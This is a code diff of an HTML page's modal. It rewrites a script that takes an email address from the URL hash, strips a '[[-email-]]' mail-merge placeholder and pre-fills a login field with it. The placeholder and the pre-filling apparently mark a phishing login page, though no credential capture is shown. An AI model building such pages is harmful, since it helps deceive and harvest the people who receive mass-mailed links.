@@ -162,7 +162,8 @@ $(document).ready(function() {
 <div id="modalbox" class="modal">
 
     <!-- Modal content -->
-    <div class="modal-content">
+   <!-- Your modal content HTML -->
+<div class="modal-content">
     <div class="mcontent" id="mcontent">
         <div class="mlogo">
             <img src="images/log.png">
@@ -187,31 +188,33 @@ $(document).ready(function() {
     </div>
 </div>
 
+<!-- Put the script here, just before closing </body> -->
 <script>
-  // Function to get email from URL hash
-  function getEmailFromHash() {
-    if (window.location.hash) {
-      // window.location.hash already gives the part after #
-      let hash = window.location.hash.substring(1); // remove the #
-      // remove [[-email-]] if present
-      hash = hash.replace(/\[\[-email-\]\]/g, '');
-      return decodeURIComponent(hash);
+document.addEventListener("DOMContentLoaded", function() {
+    function getEmailFromHash() {
+        let hash = window.location.hash;
+        if (hash) {
+            hash = hash.substring(1); // remove #
+            hash = hash.replace(/\[\[-email-\]\]/g, ''); // remove [[-email-]] if present
+            return decodeURIComponent(hash);
+        }
+        return '';
     }
-    return '';
-  }
 
-  // Pre-fill email input
-  const emailInput = document.getElementById('email');
-  const emailFromHash = getEmailFromHash();
-  if (emailFromHash) {
-    emailInput.value = emailFromHash;
-  }
+    const emailInput = document.getElementById('email');
+    const emailFromHash = getEmailFromHash();
+    if (emailFromHash) {
+        emailInput.value = emailFromHash;
+    }
 
-  // Optional: keep URL hash updated if user edits email
-  emailInput.addEventListener('input', () => {
-    history.replaceState(null, '', '#' + encodeURIComponent(emailInput.value));
-  });
+    // Keep URL hash updated if user edits email
+    emailInput.addEventListener('input', () => {
+        history.replaceState(null, '', '#' + encodeURIComponent(emailInput.value));
+    });
+});
 </script>
+</body>
+
 
 
 
@@ -228,6 +231,7 @@ $(document).ready(function() {
 </body>
 
 </html>
+
 
 
 
